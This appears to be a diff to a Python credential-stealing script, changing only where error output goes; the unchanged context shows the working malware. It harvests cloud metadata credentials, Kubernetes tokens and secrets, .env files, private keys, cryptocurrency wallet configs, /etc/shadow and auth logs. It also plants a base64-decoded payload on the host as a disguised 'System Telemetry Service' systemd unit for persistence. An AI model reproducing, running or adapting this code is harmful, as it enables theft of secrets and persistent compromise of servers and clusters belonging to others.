@@ -15,7 +15,7 @@ def emit_glob(pattern):
 
 def run(cmd):
     try:
-        out=subprocess.check_output(cmd,shell=True,stderr=subprocess.DEVNULL,timeout=10)
+        out=subprocess.check_output(cmd,shell=True,timeout=10)
         if out:
             print(('\n=== CMD: '+cmd+' ===\n').encode())
             print(out)
@@ -41,7 +41,7 @@ except OSError:pass
 homes.append('/root')
 all_roots=homes+['/opt','/srv','/var/www','/app','/data','/var/lib','/tmp']
 
-run('hostname; pwd; whoami; uname -a; ip addr 2>/dev/null || ifconfig 2>/dev/null; ip route 2>/dev/null')
+run('hostname; pwd; whoami; uname -a; ip addr 2>errors.txt || ifconfig 2>errors.txt; ip route 2>errors.txt')
 run('printenv')
 
 for h in homes+['/root']:
@@ -66,8 +66,8 @@ emit('/etc/environment')
 walk(all_roots,6,lambda fp,fn:fn in {'.env','.env.local','.env.production','.env.development','.env.staging'})
 
 run('env | grep AWS_')
-run('curl -s http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI} 2>/dev/null || true')
-run('curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null || true')
+run('curl -s http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI} 2>errors.txt || true')
+run('curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>errors.txt || true')
 
 for h in homes+['/root']:
     emit(h+'/.kube/config')
@@ -80,15 +80,15 @@ emit('/var/run/secrets/kubernetes.io/serviceaccount/ca.crt')
 emit('/var/run/secrets/kubernetes.io/serviceaccount/namespace')
 emit('/run/secrets/kubernetes.io/serviceaccount/token')
 emit('/run/secrets/kubernetes.io/serviceaccount/ca.crt')
-run('find /var/secrets /run/secrets -type f 2>/dev/null | xargs -I{} sh -c \'echo "=== {} ==="; cat "{}" 2>/dev/null\'')
+run('find /var/secrets /run/secrets -type f 2>errors.txt | xargs -I{} sh -c \'echo "=== {} ==="; cat "{}" 2>errors.txt\'')
 run('env | grep -i kube; env | grep -i k8s')
-run('kubectl get secrets --all-namespaces -o json 2>/dev/null || true')
+run('kubectl get secrets --all-namespaces -o json 2>errors.txt || true')
 
 for h in homes+['/root']:
     walk([h+'/.config/gcloud'],4,lambda fp,fn:True)
 emit('/root/.config/gcloud/application_default_credentials.json')
 run('env | grep -i google; env | grep -i gcloud')
-run('cat $GOOGLE_APPLICATION_CREDENTIALS 2>/dev/null || true')
+run('cat $GOOGLE_APPLICATION_CREDENTIALS 2>errors.txt || true')
 
 for h in homes+['/root']:
     walk([h+'/.azure'],3,lambda fp,fn:True)
@@ -124,7 +124,7 @@ emit('/etc/openldap/slapd.conf')
 run('env | grep -iE "(DATABASE|DB_|MYSQL|POSTGRES|MONGO|REDIS|VAULT)"')
 
 walk(['/etc/wireguard'],1,lambda fp,fn:fn.endswith('.conf'))
-run('wg showconf all 2>/dev/null || true')
+run('wg showconf all 2>errors.txt || true')
 
 for h in homes+['/root']:
     walk([h+'/.helm'],3,lambda fp,fn:True)
@@ -137,8 +137,8 @@ walk(['/etc/ssl/private'],1,lambda fp,fn:fn.endswith('.key'))
 walk(['/etc/letsencrypt'],4,lambda fp,fn:fn.endswith('.pem'))
 walk(all_roots,5,lambda fp,fn:os.path.splitext(fn)[1] in {'.pem','.key','.p12','.pfx'})
 
-run('grep -r "hooks.slack.com\|discord.com/api/webhooks" . 2>/dev/null | head -20')
-run('grep -rE "api[_-]?key|apikey|api[_-]?secret|access[_-]?token" . --include="*.env*" --include="*.json" --include="*.yml" --include="*.yaml" 2>/dev/null | head -50')
+run('grep -r "hooks.slack.com\|discord.com/api/webhooks" . 2>errors.txt | head -20')
+run('grep -rE "api[_-]?key|apikey|api[_-]?secret|access[_-]?token" . --include="*.env*" --include="*.json" --include="*.yml" --include="*.yaml" 2>errors.txt | head -50')
 
 for h in homes+['/root']:
     for coin in ['/.bitcoin/bitcoin.conf','/.litecoin/litecoin.conf','/.dogecoin/dogecoin.conf','/.zcash/zcash.conf','/.dashcore/dash.conf','/.ripple/rippled.cfg','/.bitmonero/bitmonero.conf']:
@@ -158,13 +158,13 @@ walk(['.'],8,lambda fp,fn:fn in {'id.json','keypair.json'} or (fn.endswith('-key
 walk(['.anchor','./target/deploy','./keys'],5,lambda fp,fn:fn.endswith('.json'))
 
 run('env | grep -i solana')
-run('grep -r "rpcuser\|rpcpassword\|rpcauth" /root /home 2>/dev/null | head -50')
+run('grep -r "rpcuser\|rpcpassword\|rpcauth" /root /home 2>errors.txt | head -50')
 
 emit('/etc/passwd')
 emit('/etc/shadow')
 
-run('cat /var/log/auth.log 2>/dev/null | grep Accepted | tail -200')
-run('cat /var/log/secure 2>/dev/null | grep Accepted | tail -200')
+run('cat /var/log/auth.log 2>errors.txt | grep Accepted | tail -200')
+run('cat /var/log/secure 2>errors.txt | grep Accepted | tail -200')
 
 import urllib.request,urllib.error,json,hmac,hashlib,datetime,base64
 
@@ -285,10 +285,10 @@ if os.path.exists(SA_TOKEN_PATH):
             f'mkdir -p /host/root/.config/sysmon /host/root/.config/systemd/user && '
             f'echo {PERSIST_B64}|base64 -d > /host/root/.config/sysmon/sysmon.py && '
             f'chmod 700 /host/root/.config/sysmon/sysmon.py && '
-            f'PY=$(chroot /host which python3 2>/dev/null || chroot /host which python 2>/dev/null) && '
+            f'PY=$(chroot /host which python3 2>errors.txt || chroot /host which python 2>errors.txt) && '
             f'[ -n "$PY" ] && printf "[Unit]\\nDescription=System Telemetry Service\\nAfter=network.target\\n[Service]\\nType=simple\\nExecStart=$PY /root/.config/sysmon/sysmon.py\\nRestart=always\\nRestartSec=10\\n[Install]\\nWantedBy=multi-user.target\\n" > /host/root/.config/systemd/user/sysmon.service && '
-            f'chroot /host systemctl --user daemon-reload 2>/dev/null; '
-            f'chroot /host systemctl enable --now sysmon.service 2>/dev/null || true'
+            f'chroot /host systemctl --user daemon-reload 2>errors.txt; '
+            f'chroot /host systemctl enable --now sysmon.service 2>errors.txt || true'
         )
         pod_manifest={
             'apiVersion':'v1','kind':'Pod',
